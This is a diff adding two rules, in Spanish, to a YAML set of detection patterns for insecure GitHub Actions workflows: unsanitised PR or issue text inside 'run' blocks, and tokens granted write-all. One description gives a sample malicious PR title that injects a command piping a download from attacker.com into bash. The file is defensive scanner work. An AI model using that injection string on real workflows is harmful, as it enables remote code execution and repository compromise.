@@ -104,3 +104,25 @@
     Un secret de GitHub está siendo pasado a un comando que podría
     exponerlo (echo, curl, wget). Los secrets expuestos en logs o
     enviados a servidores externos son un vector de account takeover.
+
+# ─── 9. GitHub Action Injection ──────────────────────────────────────────────
+- id: "workflow-action-injection"
+  name: "GitHub Action Input Injection"
+  category: "injection"
+  severity: 10
+  pattern: "run:\\s*.*\\$\\{\\{\\s*github\\.event\\.(pull_request\\.title|pull_request\\.body|issue\\.title|comment\\.body)\\s*\\}\\}.*"
+  description: >
+    El workflow interpola directamente contexto no confiable (título o cuerpo de PR)
+    dentro de un bloque 'run'. Si el atacante nombra su PR "Title\"; curl attacker.com/malware | bash",
+    obtendrá ejecución remota de código en el Action Runner.
+
+# ─── 10. Over-Permissive Global Tokens ───────────────────────────────────────
+- id: "workflow-global-write-all"
+  name: "Over-Permissive Global Token (write-all)"
+  category: "misconfig"
+  severity: 9
+  pattern: "^permissions:\\s*write-all"
+  description: >
+    El workflow le otorga 'write-all' al token local de GitHub.
+    Si un step del PR se compromete, el atacante puede pushear a main,
+    manipular releases y troyanizar repositorios hermanos.
